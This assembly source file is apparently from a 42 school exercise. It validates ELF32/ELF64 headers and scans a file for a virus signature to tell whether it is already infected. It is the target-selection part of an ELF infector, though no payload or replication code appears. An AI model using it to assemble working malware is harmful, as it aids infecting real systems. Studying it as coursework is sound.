; **************************************************************************** ;
;                                                                              ;
;    elf_check.asm                                        :::      ::::::::    ;
;                                                       :+:      :+:    :+:    ;
;    By: sdestann <sdestann@student.42perpignan.    +#+  +:+       +#+         ;
;                                                 +#+#+#+#+#+   +#+            ;
;    Created: 2025/10/13 14:07:12 by sdestann          #+#    #+#              ;
;    Updated: 2025/10/15 08:21:18 by sdestann         ###   ########.fr        ;
; **************************************************************************** ;

BITS 64

%include "include/macros.inc"
%include "include/structures.inc"

extern current_file
extern signature
extern sig_len

global check_elf64
global check_elf32
global check_infected

section .text

; =============================================================================
; check_elf64: Vérifie si le fichier mappé est un ELF64 valide
; Params: aucun (utilise current_file)
; Returns: rax = 1 si ELF64 valide, 0 sinon
; Side effects: modifie current_file.is_elf64
; =============================================================================
check_elf64:
    push rbp
    mov rbp, rsp
    
    ; Récupérer l'adresse mappée
    mov rdi, [current_file + file_info.mapped_addr]
    test rdi, rdi
    jz .not_elf
    
    ; Vérifier la taille minimale (au moins 64 octets pour l'en-tête)
    cmp qword [current_file + file_info.size], 64
    jl .not_elf
    
    ; Vérifier le magic number ELF (0x7f 'E' 'L' 'F')
    cmp byte [rdi], 0x7f
    jne .not_elf
    cmp byte [rdi + 1], 'E'
    jne .not_elf
    cmp byte [rdi + 2], 'L'
    jne .not_elf
    cmp byte [rdi + 3], 'F'
    jne .not_elf
    
    ; Vérifier que c'est un ELF 64 bits
    movzx rax, byte [rdi + E_IDENT + 4]
    cmp rax, ELFCLASS64
    jne .not_elf
    
    ; Vérifier que c'est little-endian
    movzx rax, byte [rdi + E_IDENT + 5]
    cmp rax, ELFDATA2LSB
    jne .not_elf
    
    ; Vérifier que c'est un exécutable ou shared object
    movzx rax, word [rdi + E_TYPE]
    cmp rax, ET_EXEC
    je .is_elf
    cmp rax, ET_DYN
    je .is_elf
    jmp .not_elf
    
.is_elf:
    ; Marquer comme ELF64 valide
    mov byte [current_file + file_info.is_elf64], 1
    mov rax, 1
    leave
    ret

.not_elf:
    mov byte [current_file + file_info.is_elf64], 0
    xor rax, rax
    leave
    ret

; =============================================================================
; check_elf32: Vérifie si le fichier mappé est un ELF32 valide
; Params: aucun (utilise current_file)
; Returns: rax = 1 si ELF32 valide, 0 sinon
; Side effects: modifie current_file.is_elf64
; =============================================================================
check_elf32:
    push rbp
    mov rbp, rsp
    
    ; Récupérer l'adresse mappée
    mov rdi, [current_file + file_info.mapped_addr]
    test rdi, rdi
    jz .not_elf
    
    ; Vérifier la taille minimale (au moins 52 octets pour l'en-tête ELF32)
    cmp qword [current_file + file_info.size], 52
    jl .not_elf
    
    ; Vérifier le magic number ELF (0x7f 'E' 'L' 'F')
    cmp byte [rdi], 0x7f
    jne .not_elf
    cmp byte [rdi + 1], 'E'
    jne .not_elf
    cmp byte [rdi + 2], 'L'
    jne .not_elf
    cmp byte [rdi + 3], 'F'
    jne .not_elf
    
    ; Vérifier que c'est un ELF 32 bits
    movzx rax, byte [rdi + E_IDENT + 4]
    cmp rax, ELFCLASS32
    jne .not_elf
    
    ; Vérifier que c'est little-endian
    movzx rax, byte [rdi + E_IDENT + 5]
    cmp rax, ELFDATA2LSB
    jne .not_elf
    
    ; Vérifier que c'est un exécutable ou shared object
    movzx rax, word [rdi + E_TYPE]
    cmp rax, ET_EXEC
    je .is_elf
    cmp rax, ET_DYN
    je .is_elf
    jmp .not_elf
    
.is_elf:
    ; Marquer comme ELF32 valide (pas ELF64)
    mov byte [current_file + file_info.is_elf64], 0
    mov rax, 1
    leave
    ret

.not_elf:
    mov byte [current_file + file_info.is_elf64], 0
    xor rax, rax
    leave
    ret

; =============================================================================
; check_infected: Vérifie si le fichier est déjà infecté
; Params: aucun (utilise current_file)
; Returns: rax = 1 si déjà infecté, 0 sinon
; Side effects: modifie current_file.is_infected
; =============================================================================
check_infected:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    
    ; Récupérer l'adresse mappée et la taille
    mov r12, [current_file + file_info.mapped_addr]
    mov r13, [current_file + file_info.size]
    
    ; Vérifier que le fichier est assez grand pour contenir la signature
    mov rax, [sig_len]
    cmp r13, rax
    jl .not_infected
    
    ; Calculer la fin de la zone de recherche
    mov rcx, r13
    sub rcx, [sig_len]
    inc rcx                     ; rcx = nombre de positions à vérifier
    
    ; Pointer au début du fichier
    mov rdi, r12
    
.search_loop:
    ; Vérifier si on a fini
    test rcx, rcx
    jz .not_infected
    
    ; Comparer avec la signature
    push rdi
    push rcx
    
    mov rsi, signature
    mov rdx, [sig_len]
    call memcmp
    
    pop rcx
    pop rdi
    
    ; Si match, le fichier est infecté
    test rax, rax
    jz .infected
    
    ; Avancer d'un octet
    inc rdi
    dec rcx
    jmp .search_loop

.infected:
    mov byte [current_file + file_info.is_infected], 1
    mov rax, 1
    jmp .done

.not_infected:
    mov byte [current_file + file_info.is_infected], 0
    xor rax, rax

.done:
    pop r13
    pop r12
    pop rbx
    leave
    ret

; =============================================================================
; memcmp: Compare deux zones mémoire
; Params: rdi = addr1, rsi = addr2, rdx = length
; Returns: rax = 0 si identiques, non-zero sinon
; Side effects: aucun
; =============================================================================
memcmp:
    push rcx
    
    mov rcx, rdx
    test rcx, rcx
    jz .equal
    
.loop:
    movzx rax, byte [rdi]
    movzx rdx, byte [rsi]
    sub rax, rdx
    jnz .done
    
    inc rdi
    inc rsi
    dec rcx
    jnz .loop

.equal:
    xor rax, rax

.done:
    pop rcx
    ret